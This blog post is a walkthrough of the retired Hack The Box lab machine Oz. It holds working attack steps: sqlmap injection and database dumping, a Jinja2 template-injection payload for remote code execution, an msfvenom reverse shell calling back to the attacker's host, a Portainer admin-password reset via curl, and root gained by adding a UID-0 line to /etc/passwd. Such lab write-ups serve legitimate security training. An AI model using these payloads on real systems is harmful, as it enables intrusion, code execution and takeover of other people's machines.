---
layout: post
title: "Oz: Hack The Box Walkthrough"
subtitle: "There is no place like home."
date: 2019-01-12 14:46:05 +0000
last_modified_at: 2019-01-12 14:56:04 +0000
category: Walkthrough
tags: ["Hack The Box", Oz, retired]
comments: true
image:
  feature: oz-htb-walkthrough.jpg
  credit: bgphotographyllc / Pixabay
  creditlink: https://pixabay.com/en/wizard-of-oz-emerald-city-emerald-3479395/
---

This post documents the complete walkthrough of Oz, a retired vulnerable [VM][1] created by [incidrthreat][2] and [Mumbai][3], and hosted at [Hack The Box][4]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## Background

Oz is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `nmap` scan to establish the available services in the host.

```
# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 10.10.10.96
...
PORT     STATE SERVICE REASON         VERSION
80/tcp   open  http    syn-ack ttl 62 Werkzeug httpd 0.14.1 (Python 2.7.14)
|_http-favicon: Unknown favicon MD5: AC490FD5D3697E544EA29DD28A573ED4
| http-methods:
|_  Supported Methods: HEAD OPTIONS GET POST
|_http-title: OZ webapi
|_http-trane-info: Problem with XML parsing of /evox/about
8080/tcp open  http    syn-ack ttl 62 Werkzeug httpd 0.14.1 (Python 2.7.14)
|_http-favicon: Unknown favicon MD5: 131B03077D7717DBFF2E41E52F08BC7A
| http-methods:
|_  Supported Methods: HEAD GET POST OPTIONS
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Werkzeug/0.14.1 Python/2.7.14
| http-title: GBR Support - Login
|_Requested resource was http://10.10.10.96:8080/login
|_http-trane-info: Problem with XML parsing of /evox/about
```

`nmap` finds two open ports: `80/tcp` and `8080/tcp`. Both of them originate from Python. This is how they look like.

<a class="image-popup">
![ae5d6bc5.png](/assets/images/posts/oz-htb-walkthrough/ae5d6bc5.png)
</a>

<a class="image-popup">
![0a107b46.png](/assets/images/posts/oz-htb-walkthrough/0a107b46.png)
</a>

## Directory / File Enumeration

Let's use `wfuzz` to check out what's next.

```
# wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://10.10.10.96/FUZZ
********************************************************
* Wfuzz 2.3.1 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.96/FUZZ
Total requests: 950

==================================================================
ID   Response   Lines      Word         Chars          Payload    
==================================================================

000001:  C=200      0 L        4 W           27 Ch        "e"
000002:  C=200      0 L        1 W           68 Ch        "00"
000004:  C=200      0 L        4 W           27 Ch        "02"
000003:  C=200      0 L        4 W           27 Ch        "01"
000006:  C=200      0 L        4 W           27 Ch        "1"
000007:  C=200      0 L        4 W           27 Ch        "10"
000008:  C=200      0 L        4 W           27 Ch        "100"
000005:  C=200      0 L        1 W          144 Ch        "03"
000009:  C=200      0 L        1 W          115 Ch        "1000"
000010:  C=200      0 L        4 W           27 Ch        "123"
000011:  C=200      0 L        1 W          156 Ch        "2"
000012:  C=200      0 L        1 W           59 Ch        "20"
000013:  C=200      0 L        1 W           81 Ch        "200"
000014:  C=200      0 L        4 W           27 Ch        "2000"
000015:  C=200      0 L        1 W          229 Ch        "2001"
000016:  C=200      0 L        1 W          177 Ch        "2002"
```

Hold up. Something's not right. Every request results in a 200?

<a class="image-popup">
![f6bb0172.png](/assets/images/posts/oz-htb-walkthrough/f6bb0172.png)
</a>

Just like above, the response is either one line with "Please register a username!" or a random string with mixed digits and uppercase letters.

Well, this is easy to fix with `wfuzz`'s filtering syntax.

```
# wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt --hl 0 http://10.10.10.96/FUZZ
********************************************************
* Wfuzz 2.3.1 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.96/FUZZ
Total requests: 950

==================================================================
ID   Response   Lines      Word         Chars          Payload    
==================================================================

000871:  C=200      3 L        6 W           79 Ch        "users"

Total time: 38.43956
Processed Requests: 950
Filtered Requests: 949
Requests/sec.: 24.71412
```

Awesome.

<a class="image-popup">
![2ec4f1d5.png](/assets/images/posts/oz-htb-walkthrough/2ec4f1d5.png)
</a>

Wait a tick. This is the same as requesting `/`, except for the `Content-Length`. What's going on here?

<a class="image-popup">
![9a684693.png](/assets/images/posts/oz-htb-walkthrough/9a684693.png)
</a>

If I had to guess, I would say that `/users` is part of a `REST`ful Web [API](https://en.wikipedia.org/wiki/Application_programming_interface#Web_APIs) endpoint.

Logically speaking, I should get something else if I append a username to `/users` like so.

<a class="image-popup">
![1beaebc1.png](/assets/images/posts/oz-htb-walkthrough/1beaebc1.png)
</a>

Indeed. Now look at what happens when I inject common SQL injections to `/users` passing through Burp.

```
# wfuzz -w /usr/share/wfuzz/wordlist/Injections/SQL.txt -p 127.0.0.1:8080 http://10.10.10.96/users/FUZZ
```

There's a mix of `200`s and `500`s responses. Among the `200`'s responses, there's also a mix of text and `JSON`'s.

<a class="image-popup">
![af4cf25c.png](/assets/images/posts/oz-htb-walkthrough/af4cf25c.png)
</a>

I see what's going on here. Basically there's an injection point at `/users`.

## SQL Injection

Enter `sqlmap`. The popular open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers.

```
# sqlmap --url=http://10.10.10.96/users/*
```
<a class="image-popup">
![936923f8.png](/assets/images/posts/oz-htb-walkthrough/936923f8.png)
</a>

Perfect. We can now proceed to dump the database!

```
# sqlmap --dump --url=http://10.10.10.96/users/*
```

There are two tables in the database `ozdb`: `users_gbw` and `tickets_gbw`.

<a class="image-popup">
![a6e18bbb.png](/assets/images/posts/oz-htb-walkthrough/a6e18bbb.png)
</a>

<a class="image-popup">
![61b73071.png](/assets/images/posts/oz-htb-walkthrough/61b73071.png)
</a>

Something stood out and caught my eye with the tickets. Port-knocking??!! From the look of it, the ticket number seems like a good choice of the ports to knock. But, what's the sequence? It can't be the factorial of 12, right? 12! has 479,001,600 tuples of 12 numbers. When will it end?

Line 1 and line 8 of the tickets also caught my eye. There's something interesting about Dorthi's SSH key in the database.

The best thing about `sqlmap` is that it allows one to open a shell that accepts SQL queries with the `--sql-shell` option.

```
# sqlmap --sql-shell --url=http://10.10.10.96/users/*
```

<a class="image-popup">
![05bc18d7.png](/assets/images/posts/oz-htb-walkthrough/05bc18d7.png)
</a>

According to the hints, we should be able to read Dorthi's RSA key pair at `/home/dorthi/.ssh/`.

_Private Key_

<a class="image-popup">
![82cbacc9.png](/assets/images/posts/oz-htb-walkthrough/82cbacc9.png)
</a>

_Public Key_

<a class="image-popup">
![95ac1d32.png](/assets/images/posts/oz-htb-walkthrough/95ac1d32.png)
</a>

Let's restore the key pair with `xxd`. The RSA private key is protected with a password as shown here.

<a class="image-popup">
![6fcf247d.png](/assets/images/posts/oz-htb-walkthrough/6fcf247d.png)
</a>

What's next?

## John the Ripper

According to the tickets, the GBR Support application is sharing the database. As such, we still have the password hashes of the users in `users_gbw` to crack. We can use John the Ripper for the job.

One of the password hashes was cracked relatively quick. In this case, we don't need all the passwords; one is sufficient.

<a class="image-popup">
![20253fb4.png](/assets/images/posts/oz-htb-walkthrough/20253fb4.png)
</a>

## Server-Side Template Injection

Armed with the password of `wizard.oz`, we can now log in to GBR Support.

<a class="image-popup">
![65e8e621.png](/assets/images/posts/oz-htb-walkthrough/65e8e621.png)
</a>

Recall in the `nmap` scan, both `80/tcp` and `8080/tcp` originates from Python? I'm guessing they were developed with Flask, a popular web microframework written in Python. The real giveaway was the use of the Werkzeug server. Using Flask entails the use of templates and Flask uses Jinja2, a template engine written in Python too.

Several template engines are susceptible to Server-Side Template Injection ([SSTI](https://portswigger.net/blog/server-side-template-injection)) vulnerabilities and Jinja2 is no exception.

Now that I have access to GBR Support, notice that it allows the creation of new tickets. Perhaps I can inject one of the fields?

<a class="image-popup">
![9ae85046.png](/assets/images/posts/oz-htb-walkthrough/9ae85046.png)
</a>

I found a GitHub [repository](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20injections) with a Jinja2 RCE payload like so.

```
{% raw %}
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}
{{ config['RUNCMD']('<shell command>',shell=True) }}
{% endraw %}
```

Let's give it a shot.

<a class="image-popup">
![ee912d1f.png](/assets/images/posts/oz-htb-walkthrough/ee912d1f.png)
</a>

<a class="image-popup">
![938dd641.png](/assets/images/posts/oz-htb-walkthrough/938dd641.png)
</a>

Awesome. It works! Armed with this insight, let's generate a reverse shell with `msfvenom` like so.

```
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.13.52 LPORT=1234 -f elf -o rev
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
Saved as: rev
```

Next, we host the reverse shell with Python's SimpleHTTPServer module. Let's run a `wget` command with the RCE payload.

<a class="image-popup">
![a18d3dc0.png](/assets/images/posts/oz-htb-walkthrough/a18d3dc0.png)
</a>

See if we can transfer it over.

<a class="image-popup">
![b22c3666.png](/assets/images/posts/oz-htb-walkthrough/b22c3666.png)
</a>

Great. Now, we just need to use the RCE payload to make our reverse shell executable and then launch it.

<a class="image-popup">
![72b7697c.png](/assets/images/posts/oz-htb-walkthrough/72b7697c.png)
</a>

We have shell and `root` no less!

<a class="image-popup">
![9257d778.png](/assets/images/posts/oz-htb-walkthrough/9257d778.png)
</a>

The excitement is short-lived. That's because I'm still in a container and quoting one of the lines, _"You are just wasting time now... someone else is getting user.txt"_ :disappointed:

All is not lost. Well, at least I manage to find out Dorthi's password for the private key.

<a class="image-popup">
![1461e57f.png](/assets/images/posts/oz-htb-walkthrough/1461e57f.png)
</a>

And the port-knocking sequence.

<a class="image-popup">
![b1c636bf.png](/assets/images/posts/oz-htb-walkthrough/b1c636bf.png)
</a>

## Knocking on Heaven's Door

Now that we know the port-knocking sequence, let's write a script with `nmap` as the main driver. Bear in mind the port sequences are in UDP only. That's why `nmap` is ran with `-sU`.

<div class="filename"><span>knock.sh</span></div>

```bash
#!/bin/bash

TARGET=$1

for ports in $(cat permutation.txt); do
    echo "[*] Trying sequence $ports..."
    for p in $(echo $ports | tr ',' ' '); do
        nmap -n -v0 -Pn --max-retries 0 -p $p -sU $TARGET
    done
    sleep 1
    nmap -n -v -Pn -p22 -T5 $TARGET -oN ${ports}.txt
    ssh -i ../id_rsa dorthi@$TARGET
done
```

`permutation.txt` contains the sequence `40809,50212,46969`.

True enough, the SSH service is now unlocked. But, because the sequence is valid for 15 seconds, we need to act fast.

<a class="image-popup">
![a6220114.png](/assets/images/posts/oz-htb-walkthrough/a6220114.png)
</a>

The `user.txt` is located at `dorthi`'s home directory.

<a class="image-popup">
![5736abe3.png](/assets/images/posts/oz-htb-walkthrough/5736abe3.png)
</a>

## Privilege Escalation

During enumeration of `dorthi`'s account, I noticed that `dorthi` is allowed to run the following commands as `root` without password.

<a class="image-popup">
![46e373ff.png](/assets/images/posts/oz-htb-walkthrough/46e373ff.png)
</a>

The idea behind these commands is so that `dorthi` can find out which IP address the Portainer container is on.

<a class="image-popup">
![86999f49.png](/assets/images/posts/oz-htb-walkthrough/86999f49.png)
</a>

Now, there's something very [wrong](https://github.com/portainer/portainer/issues/493) with Portainer 1.11.1; you can reset the admin password to your liking.

And, since `curl` is available, let's use it to change the admin password like so.

```
$ curl -i -H "Content-Type: application/json" -d '{"username":"admin","password":"noplacelikehome"}' 172.17.0.2:9000/api/users/admin/init
```

Next, let's forward the port to my attacking machine so that I can use my browser to access the Portainer web user interface. But first, I need to enable SSH on my machine.

_On my machine_

```
# systemctl start ssh
```

_On the remote shell_

```
$ ssh -R 10.10.13.52:9999:172.17.0.2:9000 root@10.10.13.52 -fN
```

This is how Portainer looks like.

<a class="image-popup">
![bb59f3f9.png](/assets/images/posts/oz-htb-walkthrough/bb59f3f9.png)
</a>

Oh! The sweet taste of admin access.

<a class="image-popup">
![7ef2f185.png](/assets/images/posts/oz-htb-walkthrough/7ef2f185.png)
</a>

We know that Portainer is running as `root`. And the creators are so kind to leave image `python:2.7-alpine` for us to create our own container.

<a class="image-popup">
![d147e2ca.png](/assets/images/posts/oz-htb-walkthrough/d147e2ca.png)
</a>

Let's create a container with the image and mount `/etc/password` as `/opt/passwd`. We'll add an account with the same UID as root.

_Give ourselves a TTY console_

<a class="image-popup">
![dbc6fc6a.png](/assets/images/posts/oz-htb-walkthrough/dbc6fc6a.png)
</a>

_Map `/etc/passwd` on the host to `/opt/passwd` on the container_

<a class="image-popup">
![7f248c97.png](/assets/images/posts/oz-htb-walkthrough/7f248c97.png)
</a>

_Start the container in privileged mode_

<a class="image-popup">
![255ec94d.png](/assets/images/posts/oz-htb-walkthrough/255ec94d.png)
</a>

Once the container starts, go to the console and edit `/opt/passwd` with `vi`.

<a class="image-popup">
![a2509434.png](/assets/images/posts/oz-htb-walkthrough/a2509434.png)
</a>

`to5bce5sr7eK6` is the `crypt` hash of "toor" with salt "toor".

```
# perl -e 'print crypt("toor", "toor")'
```

Once that's done, we can `su` to `root` in the low-privileged shell obtained earlier.

<a class="image-popup">
![465400fc.png](/assets/images/posts/oz-htb-walkthrough/465400fc.png)
</a>

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/152
[2]: https://www.hackthebox.eu/home/users/profile/442
[3]: https://www.hackthebox.eu/home/users/profile/2686
[4]: https://www.hackthebox.eu/
